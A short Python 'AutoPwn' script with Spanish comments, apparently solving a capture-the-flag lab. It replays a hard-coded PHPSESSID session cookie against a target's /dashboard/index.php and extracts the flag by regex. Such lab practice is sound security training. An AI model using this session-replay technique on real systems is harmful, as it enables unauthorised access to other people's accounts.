#!/usr/bin/python3

import argparse
import requests
import re

class Exploit:
    def __init__(self, ip_address):
        self.ip_address = ip_address

    def run(self, ip_address):

        url = 'http://' + self.ip_address + '/dashboard/index.php'
        cookie = 'PHPSESSID=v8vtc2unscea8p26ed63p2338f'

        # Realizar la solicitud GET con la cookie
        response = requests.get(url, headers={'Cookie': cookie})
        content = response.text

        # Aplicar el filtro con grep utilizando expresiones regulares
        pattern = r'Here is your flag: ([a-f0-9]+)'
        matches = re.findall(pattern, content)

        if matches:
            flag = matches[0]
            print(f"El contenido de la 'flag': {flag}")
        else:
            print("No se encontró ninguna flag en la página.")

def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    return parser.parse_args()

def main():
    args = get_arguments()

    exploit = Exploit(args.ip_address)
    exploit.run(args.ip_address)

if __name__ == '__main__':
    main()






















